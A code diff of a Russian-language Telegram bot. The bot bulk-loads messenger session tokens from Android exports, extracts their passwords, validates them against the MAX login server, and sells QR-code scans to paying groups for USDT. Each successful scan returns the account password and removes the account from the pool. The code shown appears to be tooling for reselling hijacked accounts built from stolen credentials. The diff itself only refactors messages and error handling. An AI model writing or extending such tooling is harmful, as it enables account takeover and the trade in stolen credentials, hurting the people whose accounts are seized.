@@ -255,11 +255,8 @@ class QRScanner:
 # ==================== ИЗВЛЕЧЕНИЕ ПАРОЛЯ ИЗ ТОКЕНА ====================
 
 class TokenPasswordExtractor:
-    """Извлекает пароль из токена, если он там зашифрован"""
-    
     @staticmethod
     def extract_password_from_token(token: str) -> str:
-        """Пытается извлечь пароль из токена разными методами"""
         if not token or len(token) < 20:
             return ""
         
@@ -439,8 +436,6 @@ class TokenPasswordExtractor:
 # ==================== УНИВЕРСАЛЬНЫЙ ПАРСЕР ТОКЕНОВ ====================
 
 class UniversalTokenParser:
-    """Универсальный парсер для любых форматов экспорта токенов"""
-    
     @staticmethod
     def extract_token(text: str) -> str:
         patterns = [
@@ -519,7 +514,6 @@ class UniversalTokenParser:
         patterns = [
             r'(?:password|pass|pwd)["\s:=]+([^\s\n"]+)',
             r'(?:^|\n)([A-Za-z0-9@#$%^&*!]{4,30})(?:\n|$)',
-            r'пароль[:\s]+([^\s\n]+)',
         ]
         
         for pattern in patterns:
@@ -567,7 +561,6 @@ class UniversalTokenParser:
     @staticmethod
     def parse_text_block(text: str) -> list:
         results = []
-        
         blocks = re.split(r'\n\s*\n|---+|\*\*\*+|===+', text)
         
         for block in blocks:
@@ -797,7 +790,7 @@ async def validate_token(token: str, device_id: str, device_info: dict = None) -
     
     try:
         if not scanner.conn.connect():
-            return {"valid": False, "error": "Не удалось подключиться к серверу"}
+            return {"valid": False, "error": "Connection failed"}
         
         now_ms = int(time.time() * 1000)
         user_agent = {
@@ -836,7 +829,7 @@ async def validate_token(token: str, device_id: str, device_info: dict = None) -
         resp = scanner.conn.send(Packet(Opcode.LOGIN, pack(login_payload)))
         
         if not resp or not resp.payload:
-            return {"valid": False, "error": "Пустой ответ от сервера"}
+            return {"valid": False, "error": "Empty response"}
         
         data = unpack(resp.payload)
         
@@ -848,11 +841,11 @@ async def validate_token(token: str, device_id: str, device_info: dict = None) -
                 first_item = data[0]
                 if isinstance(first_item, dict):
                     if first_item.get("passwordChallenge"):
-                        return {"valid": True, "has_2fa": True, "warning": "Требуется 2FA"}
+                        return {"valid": True, "has_2fa": True, "warning": "2FA required"}
                     if "error" in first_item:
                         error_msg = str(first_item["error"])
                         if "password" in error_msg.lower() or "2fa" in error_msg.lower():
-                            return {"valid": True, "has_2fa": True, "warning": f"Требуется 2FA: {error_msg}"}
+                            return {"valid": True, "has_2fa": True, "warning": error_msg}
                         return {"valid": False, "error": error_msg}
                 elif isinstance(first_item, (int, float)):
                     return {"valid": True}
@@ -860,24 +853,48 @@ async def validate_token(token: str, device_id: str, device_info: dict = None) -
         
         if isinstance(data, dict):
             if data.get("passwordChallenge"):
-                return {"valid": True, "has_2fa": True, "warning": "Требуется 2FA"}
+                return {"valid": True, "has_2fa": True, "warning": "2FA required"}
             if "error" in data:
                 error_msg = str(data["error"])
                 if "password" in error_msg.lower() or "2fa" in error_msg.lower():
-                    return {"valid": True, "has_2fa": True, "warning": f"Требуется 2FA: {error_msg}"}
+                    return {"valid": True, "has_2fa": True, "warning": error_msg}
                 return {"valid": False, "error": error_msg}
             return {"valid": True}
         
         if data:
             return {"valid": True}
         
-        return {"valid": False, "error": "Неизвестный формат ответа"}
+        return {"valid": False, "error": "Unknown response format"}
         
     except Exception as e:
         logger.error(f"Token validation error: {e}")
         return {"valid": False, "error": str(e)}
     finally:
         scanner.conn.close()
+
+# ==================== БЕЗОПАСНАЯ ОТПРАВКА СООБЩЕНИЙ ====================
+
+async def safe_send_message(chat_id: int, text: str, parse_mode: str = None, **kwargs):
+    """Безопасная отправка сообщений с обработкой ошибок HTML"""
+    try:
+        # Экранируем проблемные символы если нужно
+        if parse_mode == "HTML":
+            # Заменяем неправильные пробелы в тегах
+            text = text.replace("< b>", "<b>").replace("< /b>", "</b>")
+            text = text.replace("< i>", "<i>").replace("< /i>", "</i>")
+            text = text.replace("< code>", "<code>").replace("< /code>", "</code>")
+            
+        return await bot.send_message(chat_id, text, parse_mode=parse_mode, **kwargs)
+    except Exception as e:
+        logger.error(f"Error sending message: {e}")
+        # Пробуем отправить без форматирования
+        try:
+            # Убираем все HTML теги
+            clean_text = re.sub(r'<[^>]+>', '', text)
+            return await bot.send_message(chat_id, clean_text, **kwargs)
+        except Exception as e2:
+            logger.error(f"Error sending plain message: {e2}")
+            return None
 
 # ==================== КЛАВИАТУРЫ ====================
 
@@ -907,32 +924,36 @@ async def start(message: types.Message):
     is_admin = user_id == ADMIN_ID
     balance = get_user_balance(user_id)
     group_id = get_user_group(user_id)
-    group_text = f"привязана к группе <code>{group_id}</code>" if group_id else "не привязаны ни к одной группе"
+    
+    if group_id:
+        group_text = f"привязана к группе <code>{group_id}</code>"
+    else:
+        group_text = "не привязаны ни к одной группе"
     
     kb = admin_keyboard() if is_admin else main_keyboard()
     
-    await message.answer(
-        f"🤖 <b>ДОБРО ПОЖАЛОВАТЬ!</b>\n\n"
-        f"Я бот для автосканирования QR MAX в группах.\n\n"
-        f"📌 <b>КАК ЭТО РАБОТАЕТ:</b>\n"
-        f"1. Добавьте бота в свою группу (<b>обязательно выдайте права администратора</b>)\n"
-        f"2. Напишите в этой группе: /link\n"
-        f"3. Группа будет привязана к вашему аккаунту\n"
-        f"4. Пополните баланс (кнопка ниже)\n"
-        f"5. Любой участник группы сможет писать /qr\n"
-        f"6. $ будут списываться с ВАШЕГО баланса\n\n"
+    text = (
+        "🤖 <b>ДОБРО ПОЖАЛОВАТЬ!</b>\n\n"
+        "Я бот для автосканирования QR MAX в группах.\n\n"
+        "📌 <b>КАК ЭТО РАБОТАЕТ:</b>\n"
+        "1. Добавьте бота в свою группу (<b>обязательно выдайте права администратора</b>)\n"
+        "2. Напишите в этой группе: /link\n"
+        "3. Группа будет привязана к вашему аккаунту\n"
+        "4. Пополните баланс (кнопка ниже)\n"
+        "5. Любой участник группы сможет писать /qr\n"
+        "6. $ будут списываться с ВАШЕГО баланса\n\n"
         f"💰 Ваш баланс: <b>${balance:.2f}</b>\n"
         f"💎 Цена QR: <b>${PRICE_PER_QR:.2f}</b>\n"
         f"📌 Вы {group_text}\n\n"
-        f"<i>Приятного использования!</i>",
-        parse_mode="HTML",
-        reply_markup=kb
+        "<i>Приятного использования!</i>"
     )
+    
+    await safe_send_message(message.chat.id, text, parse_mode="HTML", reply_markup=kb)
 
 @dp.message(F.text == "/link")
 async def link_group(message: types.Message):
     if message.chat.type not in ["group", "supergroup"]:
-        await message.answer("❌ Эта команда работает только в группах!")
+        await safe_send_message(message.chat.id, "❌ Эта команда работает только в группах!")
         return
     
     user_id = message.from_user.id
@@ -941,9 +962,9 @@ async def link_group(message: types.Message):
     if group_id in groups:
         owner = groups[group_id]["owner_id"]
         if str(user_id) == owner:
-            await message.answer("✅ Эта группа уже привязана к вашему аккаунту!")
+            await safe_send_message(message.chat.id, "✅ Эта группа уже привязана к вашему аккаунту!")
         else:
-            await message.answer("❌ Эта группа уже привязана к другому аккаунту!")
+            await safe_send_message(message.chat.id, "❌ Эта группа уже привязана к другому аккаунту!")
         return
     
     groups[group_id] = {
@@ -959,46 +980,38 @@ async def link_group(message: types.Message):
     
     save_all()
     
-    await message.answer(
-        f"✅ Группа успешно привязана!\n\n"
-        f"Владелец: <code>{user_id}</code>\n"
-        f"Теперь участники могут использовать /qr",
-        parse_mode="HTML"
-    )
+    text = f"✅ Группа успешно привязана!\n\nВладелец: <code>{user_id}</code>\nТеперь участники могут использовать /qr"
+    await safe_send_message(message.chat.id, text, parse_mode="HTML")
 
 @dp.message(F.text == "/qr")
 async def qr_command(message: types.Message, state: FSMContext):
     if message.chat.type not in ["group", "supergroup"]:
         if not accounts:
-            await message.answer("❌ Нет доступных аккаунтов для сканирования.")
+            await safe_send_message(message.chat.id, "❌ Нет доступных аккаунтов для сканирования.")
             return
-        await message.answer("📷 Отправьте фото QR-кода для сканирования.")
+        await safe_send_message(message.chat.id, "📷 Отправьте фото QR-кода для сканирования.")
         await state.set_state(AuthState.waiting_for_qr)
         return
     
     group_id = str(message.chat.id)
     
     if group_id not in groups:
-        await message.answer("❌ Эта группа не привязана. Владелец группы должен написать /link")
+        await safe_send_message(message.chat.id, "❌ Эта группа не привязана. Владелец группы должен написать /link")
         return
     
     owner_id = int(groups[group_id]["owner_id"])
     balance = get_user_balance(owner_id)
     
     if balance < PRICE_PER_QR:
-        await message.answer(
-            f"❌ Недостаточно средств у владельца группы.\n"
-            f"Баланс: ${balance:.2f}\n"
-            f"Цена QR: ${PRICE_PER_QR:.2f}",
-            parse_mode="HTML"
-        )
+        text = f"❌ Недостаточно средств у владельца группы.\nБаланс: ${balance:.2f}\nЦена QR: ${PRICE_PER_QR:.2f}"
+        await safe_send_message(message.chat.id, text, parse_mode="HTML")
         return
     
     if not accounts:
-        await message.answer("❌ Нет доступных аккаунтов для сканирования. Попробуйте позже.")
+        await safe_send_message(message.chat.id, "❌ Нет доступных аккаунтов для сканирования. Попробуйте позже.")
         return
     
-    await message.answer("📷 Отправьте фото QR-кода для сканирования.")
+    await safe_send_message(message.chat.id, "📷 Отправьте фото QR-кода для сканирования.")
     await state.set_state(AuthState.waiting_for_qr)
     await state.update_data(group_id=group_id, owner_id=owner_id)
 
@@ -1008,7 +1021,7 @@ async def handle_qr_photo(message: types.Message, state: FSMContext):
     group_id = data.get("group_id")
     owner_id = data.get("owner_id", message.from_user.id)
     
-    msg = await message.answer("⏳ Распознаю QR-код...")
+    msg = await safe_send_message(message.chat.id, "⏳ Распознаю QR-код...")
     
     try:
         photo = message.photo[-1]
@@ -1035,7 +1048,7 @@ async def handle_qr_photo(message: types.Message, state: FSMContext):
         await msg.edit_text("❌ QR-код не найден на фото.")
         
     except Exception as e:
-        await msg.edit_text(f"❌ Ошибка распознавания: {e}")
+        await msg.edit_text(f"❌ Ошибка распознавания: {str(e)}")
 
 async def process_group_qr(message, state, qr_input, msg, owner_id, group_id):
     qr_link = qr_input
@@ -1071,7 +1084,7 @@ async def process_group_qr(message, state, qr_input, msg, owner_id, group_id):
         await state.clear()
         return
     
-    # Списываем средства сразу
+    # Списываем средства
     users[owner_uid]["balance"] -= PRICE_PER_QR
     users[owner_uid]["total_scans"] = users[owner_uid].get("total_scans", 0) + 1
     save_users()
@@ -1079,7 +1092,7 @@ async def process_group_qr(message, state, qr_input, msg, owner_id, group_id):
     acc_id = list(accounts.keys())[0]
     acc = accounts[acc_id]
     
-    await msg.edit_text(f"⏳ Сканирую QR...")
+    await msg.edit_text("⏳ Сканирую QR...")
     
     scanner = QRScanner(acc["token"], acc["device_id"], acc.get("device_info"))
     
@@ -1095,7 +1108,7 @@ async def process_group_qr(message, state, qr_input, msg, owner_id, group_id):
         await asyncio.sleep(0.5)
     
     if result is None:
-        # Возвращаем средства при таймауте
+        # Возвращаем средства
         users[owner_uid]["balance"] += PRICE_PER_QR
         users[owner_uid]["total_scans"] -= 1
         save_users()
@@ -1106,18 +1119,9 @@ async def process_group_qr(message, state, qr_input, msg, owner_id, group_id):
         
         pwd = acc.get("password", "")
         if pwd:
-            text = (
-                f"✅ QR-code успешно отсканирован!\n\n"
-                f"🔐 На аккаунте установлен пароль.\n"
-                f"<b>Пароль от аккаунта:</b> <code>{pwd}</code>\n\n"
-                f"💰 Списано: ${PRICE_PER_QR:.2f}"
-            )
+            text = f"✅ QR-code успешно отсканирован!\n\n🔐 На аккаунте установлен пароль.\n<b>Пароль от аккаунта:</b> <code>{pwd}</code>\n\n💰 Списано: ${PRICE_PER_QR:.2f}"
         else:
-            text = (
-                f"✅ QR-code успешно отсканирован!\n\n"
-                f"🔓 Пароль на аккаунте отсутствует.\n\n"
-                f"💰 Списано: ${PRICE_PER_QR:.2f}"
-            )
+            text = f"✅ QR-code успешно отсканирован!\n\n🔓 Пароль на аккаунте отсутствует.\n\n💰 Списано: ${PRICE_PER_QR:.2f}"
         
         del accounts[acc_id]
         save_all()
@@ -1132,11 +1136,12 @@ async def process_group_qr(message, state, qr_input, msg, owner_id, group_id):
         del accounts[acc_id]
         save_all()
     else:
-        # Возвращаем средства при ошибке
+        # Возвращаем средства
         users[owner_uid]["balance"] += PRICE_PER_QR
         users[owner_uid]["total_scans"] -= 1
         save_users()
-        await msg.edit_text(f"❌ Ошибка: {result.get('error', 'неизвестно')}")
+        error_msg = result.get('error', 'неизвестно')
+        await msg.edit_text(f"❌ Ошибка: {error_msg}")
     
     await state.clear()
 
@@ -1145,7 +1150,7 @@ async def process_group_qr(message, state, qr_input, msg, owner_id, group_id):
 @dp.callback_query(F.data == "topup")
 async def cb_topup(callback: types.CallbackQuery, state: FSMContext):
     await state.set_state(AuthState.waiting_topup_amount)
-    await callback.message.answer("💳 Введите сумму пополнения в USDT:")
+    await safe_send_message(callback.message.chat.id, "💳 Введите сумму пополнения в USDT:")
     await callback.answer()
 
 @dp.message(AuthState.waiting_topup_amount)
@@ -1153,11 +1158,11 @@ async def handle_topup(message: types.Message, state: FSMContext):
     try:
         amount = float(message.text.strip())
     except:
-        await message.answer("❌ Введите число.")
+        await safe_send_message(message.chat.id, "❌ Введите число.")
         return
     
     if amount <= 0:
-        await message.answer("❌ Сумма должна быть больше 0.")
+        await safe_send_message(message.chat.id, "❌ Сумма должна быть больше 0.")
         return
     
     url = "https://pay.crypt.bot/api/createInvoice"
@@ -1186,17 +1191,12 @@ async def handle_topup(message: types.Message, state: FSMContext):
             builder.row(InlineKeyboardButton(text="💳 Оплатить", url=invoice_url))
             builder.row(InlineKeyboardButton(text="✅ Я оплатил", callback_data=f"check_payment_{invoice_id}"))
             
-            await message.answer(
-                f"💳 <b>Счёт на пополнение</b>\n\n"
-                f"Сумма: <b>${amount:.2f}</b>\n"
-                f"Нажмите кнопку для оплаты, затем «Я оплатил»",
-                parse_mode="HTML",
-                reply_markup=builder.as_markup()
-            )
+            text = f"💳 <b>Счёт на пополнение</b>\n\nСумма: <b>${amount:.2f}</b>\nНажмите кнопку для оплаты, затем «Я оплатил»"
+            await safe_send_message(message.chat.id, text, parse_mode="HTML", reply_markup=builder.as_markup())
         else:
-            await message.answer(f"❌ Ошибка создания счёта: {data.get('error')}")
+            await safe_send_message(message.chat.id, f"❌ Ошибка создания счёта: {data.get('error')}")
     except Exception as e:
-        await message.answer(f"❌ Ошибка: {e}")
+        await safe_send_message(message.chat.id, f"❌ Ошибка: {str(e)}")
     
     await state.clear()
 
@@ -1231,7 +1231,7 @@ async def cb_check_payment(callback: types.CallbackQuery):
         else:
             await callback.answer("❌ Счёт не найден.", show_alert=True)
     except Exception as e:
-        await callback.answer(f"❌ Ошибка проверки: {e}", show_alert=True)
+        await callback.answer(f"❌ Ошибка проверки: {str(e)}", show_alert=True)
 
 # ==================== ПРОФИЛЬ ====================
 
@@ -1242,19 +1242,14 @@ async def cb_profile(callback: types.CallbackQuery):
     group_id = get_user_group(user_id)
     total_scans = users.get(str(user_id), {}).get("total_scans", 0)
     
-    text = (
-        f"👤 <b>Ваш профиль</b>\n\n"
-        f"💰 Баланс: <b>${balance:.2f}</b>\n"
-        f"📷 Всего сканов: <b>{total_scans}</b>\n"
-        f"💎 Цена QR: <b>${PRICE_PER_QR:.2f}</b>\n"
-    )
+    text = f"👤 <b>Ваш профиль</b>\n\n💰 Баланс: <b>${balance:.2f}</b>\n📷 Всего сканов: <b>{total_scans}</b>\n💎 Цена QR: <b>${PRICE_PER_QR:.2f}</b>\n"
     
     if group_id:
         text += f"📌 Группа: <code>{group_id}</code>"
     else:
         text += "📌 Не привязаны к группе"
     
-    await callback.message.answer(text, parse_mode="HTML")
+    await safe_send_message(callback.message.chat.id, text, parse_mode="HTML")
     await callback.answer()
 
 # ==================== ИЗМЕНЕНИЕ БАЛАНСА АДМИНОМ ====================
@@ -1267,7 +1262,7 @@ async def cb_admin_edit_balance(callback: types.CallbackQuery, state: FSMContext
     await state.set_state(AuthState.waiting_edit_balance_user)
     
     if not users:
-        await callback.message.answer("❌ Нет пользователей в базе.")
+        await safe_send_message(callback.message.chat.id, "❌ Нет пользователей в базе.")
         await state.clear()
         return
     
@@ -1283,7 +1278,7 @@ async def cb_admin_edit_balance(callback: types.CallbackQuery, state: FSMContext
     
     users_list += "Введите ID пользователя для изменения баланса:"
     
-    await callback.message.answer(users_list, parse_mode="HTML")
+    await safe_send_message(callback.message.chat.id, users_list, parse_mode="HTML")
     await callback.answer()
 
 @dp.message(AuthState.waiting_edit_balance_user)
@@ -1294,27 +1289,20 @@ async def handle_edit_balance_user(message: types.Message, state: FSMContext):
     try:
         user_id = int(message.text.strip())
     except:
-        await message.answer("❌ Введите корректный ID пользователя (число).")
+        await safe_send_message(message.chat.id, "❌ Введите корректный ID пользователя (число).")
         return
     
     uid = str(user_id)
     if uid not in users:
-        await message.answer(f"❌ Пользователь с ID <code>{user_id}</code> не найден.", parse_mode="HTML")
+        await safe_send_message(message.chat.id, f"❌ Пользователь с ID <code>{user_id}</code> не найден.", parse_mode="HTML")
         return
     
     await state.update_data(edit_user_id=user_id)
     await state.set_state(AuthState.waiting_edit_balance_amount)
     
     current_balance = users[uid].get("balance", 0)
-    await message.answer(
-        f"👤 Пользователь: <code>{user_id}</code>\n"
-        f"💰 Текущий баланс: <b>${current_balance:.2f}</b>\n\n"
-        f"Введите <b>новый баланс</b> (число) или используйте:\n"
-        f"• <code>+50</code> — добавить 50\n"
-        f"• <code>-10</code> — снять 10\n"
-        f"• <code>100</code> — установить 100",
-        parse_mode="HTML"
-    )
+    text = f"👤 Пользователь: <code>{user_id}</code>\n💰 Текущий баланс: <b>${current_balance:.2f}</b>\n\nВведите <b>новый баланс</b> (число) или используйте:\n• <code>+50</code> — добавить 50\n• <code>-10</code> — снять 10\n• <code>100</code> — установить 100"
+    await safe_send_message(message.chat.id, text, parse_mode="HTML")
 
 @dp.message(AuthState.waiting_edit_balance_amount)
 async def handle_edit_balance_amount(message: types.Message, state: FSMContext):
@@ -1336,14 +1324,14 @@ async def handle_edit_balance_amount(message: types.Message, state: FSMContext):
             amount = float(amount_str[1:])
             new_balance = users[uid].get("balance", 0) - amount
             if new_balance < 0:
-                await message.answer("❌ Баланс не может быть отрицательным!")
+                await safe_send_message(message.chat.id, "❌ Баланс не может быть отрицательным!")
                 return
             users[uid]["balance"] = new_balance
             operation = f"снято <b>${amount:.2f}</b>"
         else:
             amount = float(amount_str)
             if amount < 0:
-                await message.answer("❌ Баланс не может быть отрицательным!")
+                await safe_send_message(message.chat.id, "❌ Баланс не может быть отрицательным!")
                 return
             old_balance = users[uid].get("balance", 0)
             users[uid]["balance"] = amount
@@ -1351,50 +1339,42 @@ async def handle_edit_balance_amount(message: types.Message, state: FSMContext):
         
         save_users()
         
-        await message.answer(
-            f"✅ Баланс пользователя <code>{user_id}</code> изменён!\n\n"
-            f"💰 {operation}\n"
-            f"💳 Новый баланс: <b>${users[uid]['balance']:.2f}</b>",
-            parse_mode="HTML"
-        )
+        text = f"✅ Баланс пользователя <code>{user_id}</code> изменён!\n\n💰 {operation}\n💳 Новый баланс: <b>${users[uid]['balance']:.2f}</b>"
+        await safe_send_message(message.chat.id, text, parse_mode="HTML")
         
         try:
-            await bot.send_message(
-                user_id,
-                f"💰 Ваш баланс был изменён администратором!\n\n"
-                f"💳 Текущий баланс: <b>${users[uid]['balance']:.2f}</b>",
-                parse_mode="HTML"
-            )
+            await safe_send_message(user_id, f"💰 Ваш баланс был изменён администратором!\n\n💳 Текущий баланс: <b>${users[uid]['balance']:.2f}</b>", parse_mode="HTML")
         except:
             pass
         
     except ValueError:
-        await message.answer("❌ Введите корректное число или используйте форматы:\n• +50 — добавить\n• -10 — снять\n• 100 — установить")
+        await safe_send_message(message.chat.id, "❌ Введите корректное число или используйте форматы:\n• +50 — добавить\n• -10 — снять\n• 100 — установить")
         return
     
     await state.clear()
 
-# ==================== ЗАГРУЗКА ТОКЕНОВ С ДЕТАЛЬНЫМ ВЫВОДОМ ====================
+# ==================== ЗАГРУЗКА ТОКЕНОВ ====================
 
 @dp.callback_query(F.data == "admin_upload")
 async def cb_admin_upload(callback: types.CallbackQuery):
     if callback.from_user.id != ADMIN_ID:
         return await callback.answer("❌ Только для админа", show_alert=True)
     
-    await callback.message.answer(
+    text = (
         "📦 <b>Отправьте файл с токенами</b>\n\n"
         "<b>Поддерживаемые форматы:</b>\n"
-        "• <code>.txt</code> - любые текстовые форматы токенов\n"
-        "• <code>.json</code> - JSON любого формата\n"
-        "• <code>.zip</code> - архив с файлами\n\n"
+        "• .txt - любые текстовые форматы токенов\n"
+        "• .json - JSON любого формата\n"
+        "• .zip - архив с файлами\n\n"
         "<b>Бот покажет детальную информацию:</b>\n"
         "• Номер телефона/устройство\n"
         "• Пароль (если найден)\n"
         "• Статус проверки\n"
         "• Ошибки для нерабочих токенов\n\n"
-        "<i>Поддерживаются все форматы экспорта Android!</i>",
-        parse_mode="HTML"
+        "<i>Поддерживаются все форматы экспорта Android!</i>"
     )
+    
+    await safe_send_message(callback.message.chat.id, text, parse_mode="HTML")
     await callback.answer()
 
 @dp.message(F.document)
@@ -1406,10 +1386,10 @@ async def handle_document(message: types.Message):
     file_name = doc.file_name.lower()
     
     if not file_name.endswith(('.txt', '.json', '.zip')):
-        await message.answer("❌ Отправьте файл .txt, .json или .zip")
+        await safe_send_message(message.chat.id, "❌ Отправьте файл .txt, .json или .zip")
         return
     
-    msg = await message.answer("⏳ Обрабатываю файл...")
+    msg = await safe_send_message(message.chat.id, "⏳ Обрабатываю файл...")
     
     try:
         file = await bot.get_file(doc.file_id)
@@ -1419,8 +1399,6 @@ async def handle_document(message: types.Message):
         skipped = 0
         duplicates = 0
         passwords_found = 0
-        
-        # Собираем детальную информацию о каждом токене
         token_details = []
         
         if file_name.endswith('.zip'):
@@ -1446,20 +1424,12 @@ async def handle_document(message: types.Message):
         
         save_accounts()
         
-        # Формируем детальный отчет о загрузке
-        report = (
-            f"📦 <b>ЗАГРУЗКА ТОКЕНОВ</b>\n\n"
-            f"➕ Добавлено: <b>{added}</b>\n"
-            f"🔄 Дубликатов: <b>{duplicates}</b>\n"
-            f"⏭ Пропущено: <b>{skipped}</b>\n"
-            f"🔑 Найдено паролей: <b>{passwords_found}</b>\n"
-            f"📊 Всего в базе: <b>{len(accounts)}</b>\n"
-        )
+        # Отчет о загрузке
+        report = f"📦 <b>ЗАГРУЗКА ТОКЕНОВ</b>\n\n➕ Добавлено: <b>{added}</b>\n🔄 Дубликатов: <b>{duplicates}</b>\n⏭ Пропущено: <b>{skipped}</b>\n🔑 Найдено паролей: <b>{passwords_found}</b>\n📊 Всего в базе: <b>{len(accounts)}</b>"
         
-        # Отправляем основной отчет
         await msg.edit_text(report, parse_mode="HTML")
         
-        # Отправляем детали по каждому токену (группами по 10)
+        # Детали по токенам (группами по 10)
         if token_details:
             detail_chunks = [token_details[i:i+10] for i in range(0, len(token_details), 10)]
             
@@ -1484,24 +1454,22 @@ async def handle_document(message: types.Message):
                         detail_text += f"🔢 <b>Payload:</b> <code>{detail['custom_payload']}</code>\n"
                     
                     if detail["status"] == "duplicate":
-                        detail_text += f"⚠️ <i>Дубликат, пропущен</i>\n"
+                        detail_text += "⚠️ <i>Дубликат, пропущен</i>\n"
                     elif detail["status"] == "error":
                         detail_text += f"❌ <i>Ошибка: {detail.get('error', 'неизвестно')}</i>\n"
                     
                     detail_text += "\n"
                 
-                # Отправляем часть деталей
+                # Отправляем частями если нужно
                 if len(detail_text) > 4000:
-                    # Разбиваем на более мелкие части если слишком длинно
                     for i in range(0, len(detail_text), 4000):
-                        await message.answer(detail_text[i:i+4000], parse_mode="HTML")
+                        await safe_send_message(message.chat.id, detail_text[i:i+4000], parse_mode="HTML")
                 else:
-                    await message.answer(detail_text, parse_mode="HTML")
+                    await safe_send_message(message.chat.id, detail_text, parse_mode="HTML")
         
-        # Начинаем проверку токенов
-        status_msg = await message.answer("🔍 <b>Начинаю проверку токенов...</b>\n<i>Это может занять несколько минут</i>", parse_mode="HTML")
+        # Проверка токенов
+        status_msg = await safe_send_message(message.chat.id, "🔍 <b>Начинаю проверку токенов...</b>\n<i>Это может занять несколько минут</i>", parse_mode="HTML")
         
-        # Проверка токенов с детальным выводом
         valid = 0
         invalid = 0
         twofa = 0
@@ -1514,25 +1482,16 @@ async def handle_document(message: types.Message):
         for acc_id, acc in list(accounts.items()):
             checked += 1
             
-            # Обновляем статус проверки каждые 5 токенов
             if checked % 5 == 0 or checked == total:
                 try:
                     await status_msg.edit_text(
-                        f"🔍 <b>Проверка токенов...</b>\n"
-                        f"Прогресс: <b>{checked}/{total}</b>\n"
-                        f"✅ Валидных: <b>{valid}</b>\n"
-                        f"🔐 С 2FA: <b>{twofa}</b>\n"
-                        f"❌ Битых: <b>{invalid}</b>",
+                        f"🔍 <b>Проверка токенов...</b>\nПрогресс: <b>{checked}/{total}</b>\n✅ Валидных: <b>{valid}</b>\n🔐 С 2FA: <b>{twofa}</b>\n❌ Битых: <b>{invalid}</b>",
                         parse_mode="HTML"
                     )
                 except:
                     pass
             
-            result = await validate_token(
-                acc["token"], 
-                acc["device_id"], 
-                acc.get("device_info")
-            )
+            result = await validate_token(acc["token"], acc["device_id"], acc.get("device_info"))
             
             phone = acc.get("phone", "unknown")
             password = acc.get("password", "")
@@ -1559,35 +1518,27 @@ async def handle_document(message: types.Message):
                 to_remove.append(acc_id)
                 detail["status"] = "invalid"
                 detail["error"] = result.get("error", "неизвестная ошибка")
-                logger.info(f"Invalid token {phone}: {detail['error']}")
             
             validation_details.append(detail)
         
-        # Удаляем невалидные токены
+        # Удаляем невалидные
         for acc_id in to_remove:
             del accounts[acc_id]
         save_accounts()
         
-        # Формируем отчет о проверке
-        validation_report = (
-            f"✅ <b>ПРОВЕРКА ЗАВЕРШЕНА!</b>\n\n"
-            f"📦 Всего проверено: <b>{total}</b>\n"
-            f"✅ Валидных: <b>{valid}</b>\n"
-            f"🔐 С 2FA: <b>{twofa}</b>\n"
-            f"❌ Удалено: <b>{invalid}</b>\n"
-            f"📊 Осталось в базе: <b>{len(accounts)}</b>"
-        )
+        # Отчет о проверке
+        validation_report = f"✅ <b>ПРОВЕРКА ЗАВЕРШЕНА!</b>\n\n📦 Всего проверено: <b>{total}</b>\n✅ Валидных: <b>{valid}</b>\n🔐 С 2FA: <b>{twofa}</b>\n❌ Удалено: <b>{invalid}</b>\n📊 Осталось в базе: <b>{len(accounts)}</b>"
         
-        await message.answer(validation_report, parse_mode="HTML")
+        await safe_send_message(message.chat.id, validation_report, parse_mode="HTML")
         
-        # Отправляем детали проверки (группами по 15)
+        # Детали проверки (группами по 15)
         if validation_details:
             detail_chunks = [validation_details[i:i+15] for i in range(0, len(validation_details), 15)]
             
             for chunk_num, chunk in enumerate(detail_chunks):
                 detail_text = f"📋 <b>Результаты проверки (часть {chunk_num + 1}/{len(detail_chunks)}):</b>\n\n"
                 
-                for i, detail in enumerate(chunk):
+                for detail in chunk:
                     if detail["status"] == "valid":
                         emoji = "✅"
                         status_text = "Рабочий"
@@ -1610,29 +1561,20 @@ async def handle_document(message: types.Message):
                 
                 if len(detail_text) > 4000:
                     for i in range(0, len(detail_text), 4000):
-                        await message.answer(detail_text[i:i+4000], parse_mode="HTML")
+                        await safe_send_message(message.chat.id, detail_text[i:i+4000], parse_mode="HTML")
                 else:
-                    await message.answer(detail_text, parse_mode="HTML")
+                    await safe_send_message(message.chat.id, detail_text, parse_mode="HTML")
         
         # Итоговая сводка
-        summary = (
-            f"📊 <b>ИТОГОВАЯ СВОДКА</b>\n\n"
-            f"📦 Загружено: <b>{added}</b>\n"
-            f"✅ Рабочих: <b>{valid}</b>\n"
-            f"🔐 С 2FA: <b>{twofa}</b>\n"
-            f"❌ Удалено: <b>{invalid}</b>\n"
-            f"📊 В базе: <b>{len(accounts)}</b>\n"
-            f"🔑 С паролями: <b>{passwords_found}</b>"
-        )
+        summary = f"📊 <b>ИТОГОВАЯ СВОДКА</b>\n\n📦 Загружено: <b>{added}</b>\n✅ Рабочих: <b>{valid}</b>\n🔐 С 2FA: <b>{twofa}</b>\n❌ Удалено: <b>{invalid}</b>\n📊 В базе: <b>{len(accounts)}</b>\n🔑 С паролями: <b>{passwords_found}</b>"
         
-        await message.answer(summary, parse_mode="HTML")
+        await safe_send_message(message.chat.id, summary, parse_mode="HTML")
         
     except Exception as e:
         logger.error(f"Upload error: {e}")
-        await message.answer(f"❌ <b>Ошибка при обработке файла:</b>\n<code>{str(e)}</code>", parse_mode="HTML")
+        await safe_send_message(message.chat.id, f"❌ Ошибка при обработке файла: {str(e)}")
 
 def process_content_detailed(content: str) -> tuple:
-    """Обработка содержимого файла с токенами (с детальной информацией)"""
     added = 0
     skipped = 0
     duplicates = 0
@@ -1640,7 +1582,7 @@ def process_content_detailed(content: str) -> tuple:
     token_details = []
     token_index = 0
     
-    # Пробуем распарсить как JSON
+    # Пробуем JSON
     try:
         data = json.loads(content)
         parsed_tokens = UniversalTokenParser.parse_json_data(data)
@@ -1686,7 +1628,7 @@ def process_content_detailed(content: str) -> tuple:
     except json.JSONDecodeError:
         pass
     
-    # Пробуем каждую строку как JSON
+    # Построчная обработка
     lines = content.strip().split('\n')
     json_objects = []
     text_blocks = []
@@ -1806,7 +1748,7 @@ async def cb_check_tokens(callback: types.CallbackQuery):
         return
     
     await callback.answer("🔍 Начинаю проверку...")
-    msg = await callback.message.answer(f"🔍 Проверяю <b>{len(accounts)}</b> токенов...", parse_mode="HTML")
+    msg = await safe_send_message(callback.message.chat.id, f"🔍 Проверяю <b>{len(accounts)}</b> токенов...", parse_mode="HTML")
     
     valid_count = 0
     invalid_count = 0
@@ -1819,11 +1761,7 @@ async def cb_check_tokens(callback: types.CallbackQuery):
     
     for acc_id, acc in list(accounts.items()):
         checked += 1
-        result = await validate_token(
-            acc["token"], 
-            acc["device_id"], 
